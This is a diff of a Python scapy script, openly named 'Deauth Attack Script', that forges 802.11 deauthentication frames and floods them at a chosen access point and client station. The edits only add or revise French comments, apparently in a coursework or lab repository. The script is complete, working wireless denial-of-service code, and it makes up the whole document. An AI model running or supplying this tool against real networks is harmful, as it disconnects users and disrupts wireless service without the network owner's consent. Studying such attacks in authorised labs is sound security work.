@@ -3,7 +3,7 @@ import argparse
 from scapy.all import conf, sendp
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 
-# Parsing des arguments
+# Parsage des arguments
 parser = argparse.ArgumentParser(prog="Deauth Attack Script",
                                  usage="deauth.py -i wlanmon0 -a 55:44:33:22:11:00 -t 00:11:22:33:44:55 -n 10 -r 3",
                                  description="Deauth script attack based on @catalyst256 script",
@@ -21,6 +21,7 @@ parser.add_argument("-r", "--Reason", required=True, help="The reason code of th
 
 args = parser.parse_args()
 
+# Définition des "reason codes" disponibles
 reasons = [1,4,5,8]
 if int(args.Reason) not in reasons:
     print("Reasons availables are :\n"+
@@ -30,6 +31,7 @@ if int(args.Reason) not in reasons:
           "8 - Desassociated because sending STA is leaving BSS")
     quit()
 
+# Par défaut, on définit l'AP comme destinataire du pacquet et la STA comme émetteur
 dest_addr = args.AP
 src_addr = args.Target
 
@@ -38,10 +40,11 @@ if int(args.Reason) == 5 :
     dest_addr = args.Target
     src_addr = args.AP
 
-# Envoi des deauth
+# Consctruction de la trame
 packet = RadioTap() / Dot11(type=0, subtype=12, addr1=dest_addr, addr2=src_addr, addr3=args.AP) / Dot11Deauth(
     reason=int(args.Reason))
 
+# Envoie de la trame "Number" fois
 for n in range(int(args.Number)):
     sendp(packet, iface=args.Interface)
     print(f"Deauth packets sent via: {args.Interface} with AP: {args.AP} and Target: {args.Target}")
